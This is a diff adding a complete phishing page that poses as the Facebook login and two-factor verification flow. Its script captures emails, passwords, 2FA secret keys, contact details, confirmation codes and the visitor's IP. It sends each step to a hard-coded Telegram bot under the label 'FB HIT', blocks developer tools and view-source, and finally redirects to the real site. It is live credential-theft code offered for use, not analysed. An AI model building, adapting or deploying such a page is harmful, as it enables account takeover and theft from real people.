@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Facebook helps you connect and share with the people in your life.">
+    <meta property="og:title" content="Facebook">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://www.facebook.com/">
+    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg">
+    <meta property="og:description" content="Facebook helps you connect and share with the people in your life.">
+    <title>Facebook</title>
+
+    <script>
+        // Anti-debugging (unchanged)
+        window.addEventListener('DOMContentLoaded', function() {
+            function checkDevTools() {
+                const threshold = 160;
+                const width = window.outerWidth - window.innerWidth;
+                const height = window.outerHeight - window.innerHeight;
+                if (width > threshold || height > threshold) {
+                    document.body.innerHTML = '<div style="padding: 20px; text-align: center;">Please disable developer tools to continue.</div>';
+                    return false;
+                }
+                return true;
+            }
+
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('keydown', e => {
+                if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S')) e.preventDefault();
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C'))) e.preventDefault();
+            });
+
+            document.querySelectorAll('form').forEach(form => {
+                form.addEventListener('submit', function() {
+                    this.querySelectorAll('button[type="submit"]').forEach(btn => {
+                        btn.disabled = true;
+                        if (btn.innerHTML) {
+                            btn.innerHTML = btn.innerHTML.replace('Continue', 'Processing...')
+                                                        .replace('Submit', 'Processing...')
+                                                        .replace('Verify', 'Verifying...');
+                        }
+                    });
+                });
+            });
+        });
+    </script>
+
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #f0f2f5; 
+            min-height:100vh; 
+            display:flex; 
+            flex-direction:column; 
+            align-items:center; 
+            padding:0; 
+            color: #050505;
+        }
+        .lang { 
+            font-size: 15px; 
+            color: #0866ff; 
+            margin: 16px 0 40px; 
+            text-align: center; 
+            width: 100%; 
+        }
+        .container { 
+            width: 100%; 
+            max-width: 420px;
+            padding: 0 16px; 
+            text-align: center; 
+            flex: 1; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: flex-start; 
+            padding-top: 40px;
+        }
+        .logo { 
+            width: 80px; 
+            height: 80px; 
+            margin: 0 auto 80px; 
+            display: block; 
+        }
+        .input-group { 
+            position: relative; 
+            margin: 20px 0; 
+            text-align: left; 
+        }
+        .input-group input { 
+            width: 100%; 
+            padding: 26px 16px 8px; 
+            border: 1px solid #dadde1; 
+            border-radius: 8px; 
+            font-size: 17px; 
+            background: white; 
+            transition: border 0.2s, box-shadow 0.2s; 
+        }
+        .input-group input:focus { 
+            border-color: #0866ff; 
+            box-shadow: 0 0 0 2px rgba(8,102,255,.2); 
+            outline: none; 
+        }
+        .input-group label { 
+            position: absolute; 
+            top: 18px; 
+            left: 16px; 
+            color: #8a8d91; 
+            font-size: 17px; 
+            pointer-events: none; 
+            transition: all 0.25s ease; 
+        }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label { 
+            top: 8px; 
+            left: 16px; 
+            font-size: 12px; 
+            color: #0866ff; 
+        }
+        .password-toggle { 
+            position: absolute; 
+            right: 16px; 
+            top: 18px; 
+            color: #65676b; 
+            font-size: 14px; 
+            cursor: pointer; 
+            user-select: none; 
+        }
+        button.primary { 
+            width:100%; 
+            padding: 12px; 
+            background: #0866ff; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 17px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin: 16px 0; 
+            height: 48px; 
+            position: relative; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        button.primary:active { 
+            background: #075ce6; 
+        }
+        button.primary:disabled {
+            background: #a8c7fa;
+            cursor: not-allowed;
+        }
+        .loader {
+            border: 3px solid rgba(255,255,255,0.4);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            margin-top: -10px;
+            margin-left: -10px;
+        }
+        .button-loader {
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .secondary-btn { 
+            width:100%; 
+            padding: 12px; 
+            background: #e4e6eb; 
+            color: #050505; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 17px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin: 8px 0 32px; 
+            height: 48px; 
+        }
+        .secondary-btn:active { 
+            background: #d8dade; 
+        }
+        .link { 
+            color: #0866ff; 
+            font-size: 15px; 
+            margin: 16px 0; 
+            display: block; 
+            text-decoration: none;
+        }
+        .footer { 
+            font-size: 12px; 
+            color: #737373; 
+            margin-top: 40px; 
+            padding-bottom: 40px; 
+            text-align: center; 
+            width: 100%;
+            max-width: 420px;
+        }
+        .footer a { 
+            color: #737373; 
+            text-decoration: none; 
+            margin: 0 8px; 
+        }
+        .footer .meta { 
+            margin-top: 12px; 
+            font-weight: 500; 
+        }
+        .guide-container, .code-container, .phone-container {
+            background: white;
+            border-radius: 12px;
+            padding: 24px 20px;
+            margin: 0 auto;
+            max-width: 380px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+        .fb-logo { width: 140px; margin: 0 auto 30px; display: block; }
+        .screen-title { font-size: 24px; font-weight: bold; margin-bottom: 16px; color: #050505; }
+        .screen-text { font-size: 15px; color: #606770; margin-bottom: 24px; line-height: 1.5; }
+        .method-selector {
+            display: flex;
+            border: 1px solid #dadde1;
+            border-radius: 8px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .method-option {
+            flex: 1;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            background: white;
+            transition: background-color 0.2s;
+        }
+        .method-option:hover { background: #f0f2f5; }
+        .method-option.selected { background: #e7f3ff; border-bottom: 2px solid #0866ff; }
+        .method-icon { font-size: 24px; margin-bottom: 8px; }
+        .method-label { font-size: 14px; font-weight: 600; color: #050505; }
+        .method-desc { font-size: 12px; color: #606770; margin-top: 4px; }
+        .code-input-container {
+            margin: 24px 0;
+            text-align: left;
+        }
+        .code-input {
+            width: 100%;
+            padding: 16px;
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 4px;
+            text-align: center;
+            border: 2px solid #dadde1;
+            border-radius: 8px;
+            background: white;
+            transition: all 0.2s;
+        }
+        .code-input:focus {
+            border-color: #0866ff;
+            box-shadow: 0 0 0 2px rgba(8,102,255,.2);
+            outline: none;
+        }
+        .code-display-container {
+            background: #e7f3ff;
+            padding: 24px;
+            border-radius: 12px;
+            margin: 24px 0;
+        }
+        .code-display {
+            font-size: 36px;
+            letter-spacing: 8px;
+            font-weight: 800;
+            color: #0866ff;
+            font-family: monospace;
+        }
+        .countdown {
+            font-size: 14px;
+            color: #606770;
+            margin: 12px 0;
+        }
+        .countdown.red {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+        .security-image {
+            width: 100%;
+            max-width: 320px;
+            margin: 20px auto;
+            display: block;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- 1. LOGIN -->
+    <div id="step-login">
+        <div class="lang">English (US)</div>
+        <img src="https://i.ibb.co/nNpsMQsk/IMG-2173.png" alt="Facebook" class="logo">
+
+        <form id="frm-login">
+            <input type="hidden" name="step" value="login">
+            <div class="input-group">
+                <input type="text" name="email" placeholder=" " required autocomplete="off" autocorrect="off" autocapitalize="none">
+                <label>Email or phone number</label>
+            </div>
+            <div class="input-group">
+                <input type="text" name="pass" id="pass-login" placeholder=" " required autocomplete="off">
+                <label>Password</label>
+                <span class="password-toggle" onclick="togglePass('pass-login', this)">Show</span>
+            </div>
+            <button type="submit" class="primary">Log In</button>
+        </form>
+
+        <a href="#" class="link">Forgotten password?</a>
+        <button class="secondary-btn">Create new account</button>
+
+        <div class="footer">
+            <a href="#">About</a> • <a href="#">Help</a> • <a href="#">More</a>
+            <div class="meta">Meta © 2026</div>
+        </div>
+    </div>
+
+    <!-- 2. 2FA GUIDE -->
+    <div id="step-guide" style="display:none">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" class="fb-logo" alt="">
+        <div class="guide-container">
+            <div class="screen-title">Confirm with Facebook App</div>
+            <div class="screen-text">To secure your account, we need to verify it's really you. Open the Facebook app on your mobile device and follow these steps:</div>
+
+            <div style="text-align:left;margin:20px 0;">
+                <div style="display:flex;align-items:flex-start;margin-bottom:15px;">
+                    <div style="background:#0866ff;color:white;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;margin-right:12px;">1</div>
+                    <div>Open Facebook app on your mobile device</div>
+                </div>
+                <div style="display:flex;align-items:flex-start;margin-bottom:15px;">
+                    <div style="background:#0866ff;color:white;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;margin-right:12px;">2</div>
+                    <div>Go to Settings & Privacy → Settings</div>
+                </div>
+                <div style="display:flex;align-items:flex-start;margin-bottom:15px;">
+                    <div style="background:#0866ff;color:white;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;margin-right:12px;">3</div>
+                    <div>Tap Accounts Center → Password and security</div>
+                </div>
+                <div style="display:flex;align-items:flex-start;margin-bottom:15px;">
+                    <div style="background:#0866ff;color:white;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;margin-right:12px;">4</div>
+                    <div>Select Two-factor authentication</div>
+                </div>
+                <div style="display:flex;align-items:flex-start;margin-bottom:20px;">
+                    <div style="background:#0866ff;color:white;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;margin-right:12px;">5</div>
+                    <div>Copy Secret Key or scan QR Code</div>
+                </div>
+            </div>
+
+            <form id="frm-guide">
+                <input type="hidden" name="step" value="key">
+                <div class="input-group">
+                    <input type="text" name="secret" placeholder=" " required autocomplete="off">
+                    <label>Paste Secret Key here</label>
+                </div>
+                <button type="submit" class="primary">Verify & Get Code</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- 3. 2FA CODE - REAL TOTP with auto-refresh -->
+    <div id="step-code" style="display:none">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" class="fb-logo" alt="">
+        <div class="code-container">
+            <div class="screen-title">Verification Code</div>
+            <div class="screen-text">Enter this code in the Facebook app to complete the verification:</div>
+
+            <div style="background:#e7f3ff;padding:24px;border-radius:12px;margin:24px 0;font-size:36px;letter-spacing:8px;font-weight:800;color:#0866ff;font-family:monospace;" id="totp-code">
+                Loading...
+            </div>
+
+            <div style="font-size:14px;color:#606770;margin-bottom:24px;">
+                Code refreshes in <span id="countdown" class="countdown">30</span> seconds
+            </div>
+
+            <form id="frm-done">
+                <input type="hidden" name="step" value="done">
+                <button type="submit" class="primary">I've entered the code</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- 4. PHONE OR EMAIL INPUT -->
+    <div id="step-phone" style="display:none">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" class="fb-logo" alt="">
+        <div class="phone-container">
+            <div class="screen-title">Confirm Your Account</div>
+            <div class="screen-text">For added security, we need to verify it's really you. We'll send a code to your phone number or email address linked to your Facebook account.</div>
+
+            <img src="https://i.ibb.co/QvMMqq9J/IMG-2164.jpg" alt="Security Verification" class="security-image">
+
+            <div class="method-selector">
+                <div class="method-option selected" id="smsOption">
+                    <div class="method-icon">📱</div>
+                    <div class="method-label">Phone</div>
+                    <div class="method-desc">Send code via SMS</div>
+                </div>
+                <div class="method-option" id="emailOption">
+                    <div class="method-icon">✉️</div>
+                    <div class="method-label">Email</div>
+                    <div class="method-desc">Send code to your email</div>
+                </div>
+            </div>
+
+            <form id="frm-phone">
+                <input type="hidden" name="step" value="phone_input">
+                <input type="hidden" name="method" id="method" value="sms">
+                <div class="input-group">
+                    <input type="text" name="contact" id="contactInput" placeholder=" " required autocomplete="tel email">
+                    <label id="contactLabel">Phone number</label>
+                </div>
+                <button type="submit" class="primary">Send Code</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- 5. PHONE/EMAIL CODE INPUT - now single field, any length -->
+    <div id="step-codeinput" style="display:none">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" class="fb-logo" alt="">
+        <div class="phone-container">
+            <div class="screen-title">Enter Confirmation Code</div>
+            <div class="screen-text">We sent a code to <strong id="contactTarget">your phone/email</strong>. Enter it below.</div>
+
+            <img src="https://i.ibb.co/QvMMqq9J/IMG-2164.jpg" alt="Security Verification" class="security-image">
+
+            <form id="frm-codeinput">
+                <input type="hidden" name="step" value="code_input">
+                <div class="code-input-container">
+                    <div style="font-size:15px;color:#606770;margin-bottom:12px;text-align:left;">Enter the code:</div>
+                    <input type="tel" name="code" id="codeInput" class="code-input" inputmode="numeric" autocomplete="one-time-code" required placeholder="Enter code">
+                </div>
+                <button type="submit" class="primary">Confirm</button>
+            </form>
+        </div>
+    </div>
+
+</div>
+
+<script>
+// Global storage for login data + IP + secret
+let loginData = { email: '', pass: '', ip: 'Unknown', secret: '' };
+
+// Fetch real IP on load
+fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => { loginData.ip = data.ip || 'Unknown'; })
+    .catch(() => { loginData.ip = 'Fetch failed'; });
+
+// Password toggle
+function togglePass(id, el) {
+    const input = document.getElementById(id);
+    if (!input) return;
+    input.type = input.type === 'password' ? 'text' : 'password';
+    el.textContent = input.type === 'password' ? 'Show' : 'Hide';
+}
+
+// Hide/show screens
+function showScreen(id) {
+    document.querySelectorAll('.container > div').forEach(div => div.style.display = 'none');
+    document.getElementById(id).style.display = 'block';
+}
+
+// Realistic delay (1.8–3.2 seconds)
+function realisticDelay() {
+    return new Promise(resolve => {
+        const ms = 1800 + Math.random() * 1400;
+        setTimeout(resolve, ms);
+    });
+}
+
+// Silent Telegram send
+async function sendToTelegram(step, extraData = {}) {
+    const payload = {
+        ...loginData,
+        step: step,
+        time: new Date().toLocaleString(),
+        ...extraData
+    };
+    const text = `FB HIT\n` + Object.entries(payload).map(([k,v]) => `${k}: ${v || '—'}`).join('\n');
+    try {
+        await fetch('https://api.telegram.org/bot8459569071:AAH98ViBmNxYlw_2-1KRi6Zo7qgOPMEMyIw/sendMessage', {
+            method: 'POST',
+            body: new URLSearchParams({
+                chat_id:
+'1944734410',
+                text: text,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch {}
+}
+
+// Fetch real TOTP from server
+async function fetchTOTP(secret) {
+    try {
+        const res = await fetch('/api/totp', {
+            method: 'POST',
+            body: new URLSearchParams({ secret })
+        });
+        const json = await res.json();
+        return json.totp || '------';
+    } catch {
+        return 'Error';
+    }
+}
+
+// Auto-refresh TOTP every 30 seconds
+let totpInterval = null;
+function startTOTPRefresh(secret) {
+    if (totpInterval) clearInterval(totpInterval);
+
+    const codeEl = document.getElementById('totp-code');
+    const countdownEl = document.getElementById('countdown');
+
+    let timeLeft = 30;
+
+    const update = async () => {
+        const code = await fetchTOTP(secret);
+        codeEl.textContent = code;
+        timeLeft = 30;
+        countdownEl.textContent = timeLeft;
+        countdownEl.classList.remove('red');
+    };
+
+    update(); // initial fetch
+
+    totpInterval = setInterval(() => {
+        timeLeft--;
+        countdownEl.textContent = timeLeft;
+
+        if (timeLeft <= 5) countdownEl.classList.add('red');
+        if (timeLeft <= 0) {
+            timeLeft = 30;
+            update();
+        }
+    }, 1000);
+}
+
+// Form handler
+async function handleSubmit(e, formId, nextId, isFinal = false) {
+    e.preventDefault();
+    const form = document.getElementById(formId);
+    const data = Object.fromEntries(new FormData(form));
+    const step = data.step;
+
+    // Store login credentials
+    if (step === 'login') {
+        loginData.email = data.email || '—';
+        loginData.pass = data.pass || '—';
+    }
+
+    // Store secret for TOTP refresh
+    if (step === 'key') {
+        loginData.secret = data.secret || '';
+    }
+
+    await sendToTelegram(step, data);
+
+    const btn = form.querySelector('button.primary');
+    if (btn) {
+        const orig = btn.innerHTML;
+        btn.disabled = true;
+        btn.innerHTML = 'Processing...';
+    }
+
+    await realisticDelay();
+
+    if (step === 'key' && loginData.secret.length >= 16) {
+        showScreen('step-code');
+        startTOTPRefresh(loginData.secret); // start real auto-refresh
+    } else if (isFinal) {
+        window.location.href = 'https://www.facebook.com/';
+    } else if (nextId) {
+        showScreen(nextId);
+    }
+
+    if (btn) {
+        btn.innerHTML = orig;
+        btn.disabled = false;
+    }
+}
+
+// Attach listeners
+document.getElementById('frm-login')?.addEventListener('submit', e => handleSubmit(e, 'frm-login', 'step-guide'));
+document.getElementById('frm-guide')?.addEventListener('submit', e => handleSubmit(e, 'frm-guide', 'step-code'));
+document.getElementById('frm-done')?.addEventListener('submit', e => handleSubmit(e, 'frm-done', 'step-phone'));
+document.getElementById('frm-phone')?.addEventListener('submit', e => handleSubmit(e, 'frm-phone', 'step-codeinput'));
+document.getElementById('frm-codeinput')?.addEventListener('submit', e => handleSubmit(e, 'frm-codeinput', null, true));
+
+// Phone/email toggle
+const smsOption = document.getElementById('smsOption');
+const emailOption = document.getElementById('emailOption');
+const contactInput = document.getElementById('contactInput');
+const contactLabel = document.getElementById('contactLabel');
+const methodInput = document.getElementById('method');
+const contactTarget = document.getElementById('contactTarget');
+
+smsOption?.addEventListener('click', () => {
+    smsOption.classList.add('selected');
+    emailOption.classList.remove('selected');
+    contactLabel.textContent = 'Phone number';
+    contactInput.type = 'tel';
+    contactInput.placeholder = ' ';
+    methodInput.value = 'sms';
+    contactTarget.textContent = 'your phone';
+});
+
+emailOption?.addEventListener('click', () => {
+    emailOption.classList.add('selected');
+    smsOption.classList.remove('selected');
+    contactLabel.textContent = 'Email address';
+    contactInput.type = 'email';
+    contactInput.placeholder = ' ';
+    methodInput.value = 'email';
+    contactTarget.textContent = 'your email';
+});
+
+// No need for box auto-focus anymore (single input field)
+</script>
+
+</body>
+</html>
